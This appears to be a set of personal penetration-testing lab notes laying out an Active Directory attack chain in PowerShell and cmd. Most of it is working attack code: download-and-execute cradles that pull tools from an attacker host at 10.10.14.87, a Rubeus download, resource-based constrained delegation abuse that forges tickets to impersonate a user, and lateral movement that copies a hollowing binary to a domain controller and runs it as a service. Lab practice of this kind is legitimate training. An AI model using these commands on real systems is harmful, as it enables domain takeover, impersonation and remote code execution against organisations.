# ProLabs

Not to be copied, instead to be used as hints for the labs!!
some of the stuff i found usefull:

```powershell
(New-Object Net.WebClient).DownloadString('http://10.10.14.87/tools/bypass.ps1') | iex
(New-Object Net.WebClient).DownloadString('http://10.10.14.87/tools/powermad.ps1') | iex
(New-Object Net.WebClient).DownloadString('http://10.10.14.87/tools/powerview.ps1') | iex

$myComp = "mypc"
$targetComp = "M3DC"

New-MachineAccount -MachineAccount $myComp -Password $(ConvertTo-SecureString 'h4x' -AsPlainText -Force)

# Get SID and convert to binary format
$sid =Get-DomainComputer -Identity glokputer -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))"
$SDbytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDbytes,0)

# Add SID to msds-allowedtoactonbehalfofotheridentity (requires genericWrite)
Get-DomainComputer -Identity m3dc | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

# Check if SID is added
Get-NetComputer m3dc | Select-Object -Property name, msds-allowedtoactonbehalfofotheridentity

curl http://10.10.14.89/tools/rubeus.exe -outfile C:\Windows\tasks\rubeus.exe;

# Get hash of password
C:\windows\tasks\rubeus.exe hash /password:h4x /user:mypc$ /domain:m3c.local

AES256: F905F4CD7883BE8B269466ED8591F5E25D018558B8AF1375C1EE753C8A928BF7

klist purge

# Get TGS through RBCD
C:\windows\tasks\rubeus.exe s4u /user:mypc$ /aes256:F905F4CD7883BE8B269466ED8591F5E25D018558B8AF1375C1EE753C8A928BF7 /impersonateuser:teressa.gomez /msdsspn:ldap/m3dc.m3c.local /altservice:cifs,host,http,winrm,RPCSS,wsman /ptt
```

copy fileless lateral movement

```
powershell Copy-Item "c:\temp\hollow.exe" -destination "\\m3dc.m3c.local\c$\windows\tasks\hollow.exe"
sc \\m3dc.m3c.local create RemoteManagementService binPath=\"C:\windows\tasks\hollow.exe\"
sc \\m3dc.m3c.local start RemoteManagementService
```

certenroll

```
$SecPassword = ConvertTo-SecureString 'xxxxxxxxxx' -AsPlainText -Force; $c = New-Object System.Management.Automation.PSCredential('xxxxxx\zzzzzzzzzzz', $SecPassword)

Get-Certificate -Url https://certenroll.cyber.local/ADPolicyProvider_CEP_UsernamePassword/service.svc/CEP -Template UserCert -CertStoreLocation Cert:\CurrentUser\My -Credential $c

or

CertUtil –AddStore ROOT c:\fab-root-ca1.cer
this one as per the link suggested by website
```

